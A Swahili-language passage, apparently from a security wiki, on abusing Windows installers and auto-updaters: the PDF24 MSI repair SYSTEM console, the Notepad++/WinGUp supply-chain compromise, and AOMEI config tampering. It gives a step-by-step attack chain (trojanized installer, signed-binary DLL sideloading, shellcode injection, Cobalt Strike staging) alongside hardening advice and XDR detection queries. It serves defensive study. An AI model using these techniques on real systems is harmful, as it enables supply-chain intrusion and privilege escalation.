PDF24 Creator 11.15.1 inaonyesha hatari tofauti ya MSI repair: custom action ya usakinishaji wa printa inaweza kufungua console inayoonekana yenye haki za SYSTEM wakati wa repair. Vendor alibadilisha MSI installer katika toleo la 11.15.2 ili kushughulikia tabia hii. Toleo la zamani la bidhaa ni kidokezo cha kuanza uchunguzi tu. Kagua MSI package iliyosajiliwa au inayoweza kufikiwa, kama mtumiaji huyu anaweza kuanzisha repair, kama custom action iliyo hatarini na ucheleweshaji wa faili ya log upo, na kama desktop inayoingiliana inaweza kuonyesha console. Ucheleweshaji ulioripotiwa ulitumia oplock kwenye `faxPrnInst.log`; uwezo wa kawaida wa kuandika faili si sharti pekee la ufikiaji. Shell isiyoingiliana, package isiyoweza kufikiwa, au installer iliyowekewa kiraka inaweza kukatiza mnyororo huu. Tatizo hili halitegemei `AlwaysInstallElevated` na ni tofauti na kubadilisha script ya muda yenye jina linalotabirika.

---
## Utekaji wa remote supply-chain kupitia uthibitishaji dhaifu wa updater (WinGUp / Notepad++)

Kati ya Juni 2025 na Desemba 2025, washambuliaji waliodhibiti miundombinu ya hosting iliyotumika katika mtiririko wa update wa Notepad++ waliwasilisha manifests hasidi kwa waathiriwa waliochaguliwa. Updaters za zamani zilizotumia WinGUp hazikuthibitisha kikamilifu uhalisi wa updates, hivyo jibu la XML hasidi lingeweza kuelekeza clients kwenye URLs zinazodhibitiwa na washambuliaji. Kwa kuwa client ilikubali maudhui ya HTTPS bila kulazimisha uthibitishaji wa certificate chain inayoaminika pamoja na PE signature halali kwenye installer iliyopakuliwa, waathiriwa walipakua na kutekeleza `update.exe` ya NSIS iliyowekewa trojan.<sup>[[12]](#references)[[13]](#references)</sup>

Mtiririko wa kiutendaji (hakuna local exploit inayohitajika):
1. **Uingiliaji wa miundombinu**: vunja usalama wa CDN/hosting na ujibu ukaguzi wa updates kwa metadata ya mshambuliaji inayoelekeza kwenye URL ya upakuaji hasidi.
2. **NSIS iliyowekewa trojan**: installer hupakua/kutekeleza payload na kutumia vibaya minyororo miwili ya utekelezaji:
   - **Leta binary iliyosainiwa kisha sideload**: jumuisha `BluetoothService.exe` iliyosainiwa ya Bitdefender na uweke `log.dll` hasidi kwenye search path yake. Binary iliyosainiwa inapoendeshwa, Windows husideload `log.dll`, ambayo hufungua usimbaji na kupakia kwa reflectively Chrysalis backdoor (iliyolindwa na Warbird + API hashing ili kuzuia ugunduzi wa static).
   - **Uingizaji wa shellcode unaoendeshwa na script**: NSIS hutekeleza script ya Lua iliyocompile ambayo hutumia Win32 APIs (kwa mfano, `EnumWindowStationsW`) kuingiza shellcode na kuandaa Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Mambo ya kuzingatia kwa hardening/ugunduzi wa auto-updater yoyote:
- Lazimisha **uthibitishaji wa certificate + signature** wa installer iliyopakuliwa (weka signer wa vendor kama anayeaminika, kataa CN/chain zisizolingana) na utie saini manifest ya update yenyewe (kwa mfano, XMLDSig). Zuia redirects zinazodhibitiwa na manifest isipokuwa zimethibitishwa.
- Chukulia **sideloading ya binary iliyosainiwa ya BYO** kama pivot ya ugunduzi baada ya upakuaji: toa alert pale EXE iliyosainiwa ya vendor inapopakia jina la DLL kutoka nje ya njia yake ya kawaida ya usakinishaji (kwa mfano, Bitdefender inapopakia `log.dll` kutoka Temp/Downloads), na pale updater inapoweka/kutekeleza installers kutoka temp zenye signatures zisizo za vendor.
- Fuatilia **vielelezo maalum vya malware** vilivyoonekana katika mnyororo huu (vinafaa kama pivots za jumla): mutex `Global\Jdhfv_1.0.1`, writes zisizo za kawaida za `gup.exe` kwenye `%TEMP%`, na hatua za uingizaji wa shellcode zinazoendeshwa na Lua.
- Notepad++ ilijibu kwa kuimarisha WinGUp katika v8.8.9 na matoleo ya baadaye: XML inayorejeshwa sasa imesainiwa (XMLDSig), na builds mpya hulazimisha uthibitishaji wa certificate + signature wa installer iliyopakuliwa badala ya kutegemea transport pekee.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading ya EXE iliyosainiwa na Bitdefender ya <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ikizindua kisakinishi kisicho cha Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Mifumo hii inatumika kwa updater yoyote inayokubali manifests ambazo hazijasainiwa au isiyothibitisha signers wa installer—network hijack + malicious installer + BYO-signed sideloading husababisha remote code execution kwa kisingizio cha masasisho “trusted”.

### Notification configuration kama kichocheo cha pili cha update

Updater inaweza kutumia remote configurations tofauti **kuweka maudhui na kuanzisha utekelezaji wake**. Hili linahitaji udhibiti wa configurations au majibu yake; ripoti hazibainishi jinsi ufikiaji wa chanzo ulivyopatikana. Katika tukio la AOMEI, `down_html.ini` ilichagua URL ya archive, toleo (`thrid`), na MD5 (`Val`); mshambuliaji aliongeza toleo na kubadilisha URL pamoja na checksum inayolingana. Hili ni [hitilafu ya mpaka wa uaminifu wa metadata](#2-hijacking-the-update-channel-to-run-code-as-system) iliyojadiliwa hapo juu. Njia ya ziada ya utekelezaji ilitumia `Notifycfg.ini`: ilielekeza `ABNotify.exe` kupakia `upgrade-now.html` iliyotolewa kwenye archive kupitia URL ya ndani ya `file:///` kwenye WebView. Ukurasa ulielekeza kiotomatiki kwenye executable jirani, ambayo WebView iliikabidhi kwa system shell. Child ilirithi privileges za notifier; hili lenyewe halikuipandisha hadi SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google pia iliripoti `Notifycfg.ini` iliyochezewa, ikiwa na zaidi ya sehemu dummy zinazorudiwa 35,000 ambazo zilishinda kizuizi cha kawaida cha matoleo cha client hii. Ripoti haithibitishi bypass ya jumla ya parser. Mshambuliaji alirejesha mafaili ya remote baada ya vipindi vya dakika tano hadi kumi, kwa hiyo ni clients zilizofanya polling katika vipindi hivyo pekee zilizopokea configuration iliyobadilishwa. Channel hii ya notification pia ilibeba [chambo tofauti cha WebDAV/NTLM coercion](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) ambacho hakikuhitaji archive itekelezwe.<sup>[[18]](#references)</sup>

---
## References
- [1] [Ushauri – Netskope Client for Windows – Local Privilege Escalation kupitia Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Ushauri wa Usalama wa Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin ya Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit ya Netskope IPC](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Kupwning ASUS DriverHub, MSI Center, Acer Control Centre na Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation kupitia mafaili yanayoweza kuandikwa katika Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation katika Windows agent](https://checkmk.com/werk/16361)
- [10] [PoCs za sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Watendaji wa Nation-State Wanatumia Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – taarifa ya tukio la miundombinu iliyotekwa](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Kukwepa marekebisho ya CVE-2025-0309 katika Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Kugundua hitilafu za Privilege Escalation katika Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Kutoka gRPC hadi SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Uvunjaji wa supply chain wa AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group na Mandiant – Kuchunguza Uchezeaji wa Muda Mfupi wa Supply Chain](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
